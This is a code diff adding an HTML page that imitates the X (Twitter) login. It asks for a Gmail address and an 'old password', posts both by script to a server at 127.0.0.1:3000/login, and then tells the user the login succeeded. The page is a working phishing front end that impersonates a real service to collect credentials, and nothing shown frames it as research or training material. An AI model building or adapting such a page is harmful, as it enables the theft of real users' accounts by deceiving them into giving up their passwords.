@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X Twitter Login</title>
+    <link rel="stylesheet" href="X.css"> <!-- Link to your CSS -->
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="x-logo.png" alt="X Icon"> <!-- Replace with the actual X logo -->
+        </div>
+        <div class="form-container">
+            <!-- Input fields for email and password -->
+            <form id="loginForm">
+                <input type="email" id="email" placeholder="ENTER YOUR GMAIL" class="input-field" required />
+                <input type="password" id="password" placeholder="ENTER OLD PASSWORD" class="input-field" required />
+                <button type="submit" class="login-btn" id="loginBtn">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Get the email and password values
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Send the data to the server using fetch
+            fetch('http://127.0.0.1:3000/login', {  // Updated the URL
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
+            })
+            .then(response => response.text())
+            .then(data => {
+                console.log('Success:', data);
+                alert('Login successful!');
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                alert('Login failed. Please try again.');
+            });
+        });
+    </script>
+</body>
+</html>
